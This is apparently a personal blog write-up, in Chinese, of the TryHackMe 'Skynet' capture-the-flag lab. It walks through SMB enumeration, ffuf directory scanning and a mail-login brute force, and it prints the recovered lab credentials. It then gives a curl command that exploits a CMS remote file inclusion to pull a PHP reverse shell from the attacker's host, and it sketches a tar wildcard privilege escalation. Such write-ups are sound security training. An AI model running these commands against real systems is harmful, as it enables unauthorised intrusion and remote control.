---
title: '[thm] Skynet'
date: 2024-12-27 14:26 +0800
categories: [hack,TryHackMe]
tags: []
---

## information

![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image.png>)
> port scan

开启了http,pop3,smb等服务，我们先关注smb服务。
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-1.png>)
获得了两个文件，一个attention.txt，一个log1.txt。内容大致如下：
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-2.png>)
从attention.txt获得了一个用户名**Miles Dyson**，log1.txt类似一个密码本，也可能是用户名，我们需要找一个地方验证。
一开始我尝试使用hydra爆破pop3服务验证用户名，但是并没有成功，pop3不能直接爆破。接下去看看网页服务。
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-3.png>)
开扫。
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-4.png>)
> ffuf -u 'http://skynet.thm/FUZZ' -w ~/Documents/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -fc 404 

（这里的命令为了快速复现已经做了修改）可以发现一个squirrelmail路径。
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-5.png>)
接下来使用先前得到的账号密码进行爆破。
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-6.png>)
成功获得账号密码**web/milesdyson:cyborg007haloterminator**
这个国外小哥的命名规律对我来说还是有点麻烦的，比如这位小哥名叫Miles Dyson，他的用户名是全称，但是在其他靶机，比如dc系列，会是设置成miles。就不是很搞得清楚。
而且这里还有个问题，我一开始是使用ffuf爆破密码，但是没有爆破出来，没整明白怎么一回事，可能ffuf不适合爆破密码吧。以后还是要注意多个工具交替验证，不能是熟悉某一个就只使用这个。
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-7.png>)
登录后获得了smb的密码。**smb/milesdyson:)s{A&2Z=F^n_E.B`**
这密码还怪强的。
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-8.png>)
下载这个import.txt
```she
╭─bamuwe@Mac ~/Desktop/skynet 
╰─$ cat important.txt                                                                                                                                                        130 ↵

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

又一个新路径
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-9.png>)
开扫～
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-10.png>)
> ffuf -u 'http://skynet.thm/45kra24zxs28v3yd/FUZZ' -w ~/Documents/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-11.png>)
![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-12.png>)
存在一个1day，是一个LFI，同时也指出，可以实现远程文件包含。
思路清晰：使用1day远程文件包含reverseshell，getshell。

## user1

![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/image-13.png>)
> curl 'http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.120.122/php-reverse-shell.php'

成功getshell

## root

![alt text](<../assets/img/2024-12-27-[thm] Skynet.assets/f79b3604191df22dd7416b46275f915d.png>)
简略写一下这个提权，大概就是有一个root用户的定时任务，会用tr -cf 备份/var/www/html下的所有文件，tr -cf有一个现成的提权漏洞，我们创建两个和参数名一样的文件，就可以达到运行指定参数的效果，再插入我们想要的恶意代码。

## conclusion

- 尝试多种工具交叉验证，可以大概率避免遗漏。
- 我觉得我的wp是不是写的有点太详细了，感觉浪费了太多时间在没有推进价值的事情上面
